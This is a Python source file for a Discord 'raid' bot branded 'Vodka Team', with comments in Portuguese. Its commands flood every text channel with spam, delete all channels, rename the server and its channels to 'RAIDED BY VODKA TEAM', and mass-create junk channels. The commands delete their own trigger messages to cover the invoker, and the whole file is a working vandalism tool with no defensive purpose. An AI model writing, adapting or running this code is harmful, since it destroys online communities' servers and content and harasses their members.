import discord
from discord.ext import commands
import asyncio
import os
from dotenv import load_dotenv

load_dotenv()

TOKEN = os.getenv('DISCORD_TOKEN')

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='•', intents=intents)

# Carregar texto do arquivo
def load_text():
    try:
        with open('texto.txt', 'r', encoding='utf-8') as f:
            return f.read().strip()
    except:
        return "RAIDED BY VODKA TEAM"

# Atualizar texto em tempo real
def update_text(new_text):
    with open('texto.txt', 'w', encoding='utf-8') as f:
        f.write(new_text)

@bot.event
async def on_ready():
    print(f'Bot logado como {bot.user}')
    print(f'Em {len(bot.guilds)} servidores')
    await bot.change_presence(activity=discord.Game(name="•help | Vodka Team"))

@bot.command()
async def ping(ctx):
    """Verifica a latência do bot"""
    latency = round(bot.latency * 1000)
    await ctx.send(f'🏓 Pong! Latência: {latency}ms')

@bot.command()
async def nuke(ctx):
    """Envia 5 mensagens em todos os canais"""
    try:
        await ctx.message.delete()
        texto = load_text()
        guild = ctx.guild
        
        # Para cada canal, enviar 5 mensagens
        for channel in guild.channels:
            if isinstance(channel, discord.TextChannel):
                try:
                    for _ in range(5):
                        await channel.send(texto)
                        await asyncio.sleep(0.3)  # Pequeno delay para evitar rate limit
                except:
                    pass
                    
        await ctx.send(f'✅ NUKE executado em {len(guild.channels)} canais!', delete_after=5)
        
    except Exception as e:
        await ctx.send(f'❌ Erro: {str(e)}')

@bot.command()
async def end(ctx):
    """Apaga TODOS os canais do servidor"""
    try:
        await ctx.message.delete()
        guild = ctx.guild
        
        # Criar backup dos nomes para depois
        channels_backup = {}
        for channel in guild.channels:
            if isinstance(channel, discord.TextChannel):
                channels_backup[channel.id] = channel.name
        
        # Apagar todos os canais
        count = 0
        for channel in guild.channels:
            try:
                if isinstance(channel, (discord.TextChannel, discord.VoiceChannel, discord.CategoryChannel)):
                    await channel.delete()
                    count += 1
                    await asyncio.sleep(0.5)  # Delay para evitar rate limit
            except:
                pass
        
        # Criar canal de texto para logs
        new_channel = await guild.create_text_channel("💀-end")
        await new_channel.send(f"💀 Todos os {count} canais foram apagados!")
        await new_channel.send(f"🔄 Backup dos canais: {channels_backup}")
        
        # Renomear servidor
        try:
            await guild.edit(name="💀 RAIDED BY VODKA TEAM 💀")
        except:
            pass
            
    except Exception as e:
        await ctx.send(f'❌ Erro: {str(e)}')

@bot.command()
async def rename_all(ctx):
    """Renomeia todos os canais para RAIDED BY VODKA TEAM"""
    try:
        await ctx.message.delete()
        guild = ctx.guild
        
        # Renomear canais de texto
        for channel in guild.channels:
            if isinstance(channel, discord.TextChannel):
                try:
                    await channel.edit(name="raided-by-vodka-team")
                    await asyncio.sleep(0.3)
                except:
                    pass
                    
        # Renomear servidor
        try:
            await guild.edit(name="💀 RAIDED BY VODKA TEAM 💀")
        except:
            pass
            
        await ctx.send('✅ Todos os canais e servidor renomeados!', delete_after=5)
        
    except Exception as e:
        await ctx.send(f'❌ Erro: {str(e)}')

@bot.command()
async def set_text(ctx, *, texto):
    """Atualiza o texto do arquivo texto.txt"""
    try:
        await ctx.message.delete()
        update_text(texto)
        await ctx.send(f'✅ Texto atualizado para: {texto}', delete_after=5)
    except Exception as e:
        await ctx.send(f'❌ Erro: {str(e)}')

@bot.command()
async def info(ctx):
    """Informações do servidor"""
    guild = ctx.guild
    embed = discord.Embed(
        title=f"💀 INFORMAÇÕES DO SERVIDOR - {guild.name}",
        color=discord.Color.red()
    )
    embed.add_field(name="Total de Canais", value=len(guild.channels), inline=True)
    embed.add_field(name="Total de Membros", value=len(guild.members), inline=True)
    embed.add_field(name="Owner", value=guild.owner.mention, inline=True)
    embed.add_field(name="Texto Atual", value=load_text(), inline=False)
    
    await ctx.send(embed=embed)

@bot.command()
async def create_channels(ctx, quantidade: int = 10):
    """Cria vários canais com nomes personalizados"""
    try:
        await ctx.message.delete()
        guild = ctx.guild
        
        for i in range(quantidade):
            try:
                await guild.create_text_channel(f"🍺-vodka-team-{i+1}")
                await asyncio.sleep(0.3)
            except:
                pass
                
        await ctx.send(f'✅ {quantidade} canais criados!', delete_after=5)
        
    except Exception as e:
        await ctx.send(f'❌ Erro: {str(e)}')

# Comandos de segurança/ajuda
@bot.command()
async def help_bot(ctx):
    """Mostra todos os comandos"""
    embed = discord.Embed(
        title="💀 COMANDOS VODKA TEAM BOT 💀",
        color=discord.Color.red()
    )
    embed.add_field(name="•ping", value="Verifica latência", inline=False)
    embed.add_field(name="•nuke", value="Envia 5 mensagens em TODOS os canais", inline=False)
    embed.add_field(name="•end", value="Apaga TODOS os canais do servidor", inline=False)
    embed.add_field(name="•rename_all", value="Renomeia todos os canais", inline=False)
    embed.add_field(name="•set_text [texto]", value="Atualiza o texto das mensagens", inline=False)
    embed.add_field(name="•create_channels [qtd]", value="Cria vários canais (padrão: 10)", inline=False)
    embed.add_field(name="•info", value="Mostra informações do servidor", inline=False)
    
    await ctx.send(embed=embed)

# Rodar bot
if __name__ == "__main__":
    if not TOKEN:
        print("❌ TOKEN não encontrado! Crie um arquivo .env")
        exit(1)
    
    try:
        bot.run(TOKEN)
    except discord.LoginFailure:
        print("❌ Token inválido!")
    except Exception as e:
        print(f"❌ Erro ao rodar bot: {e}")
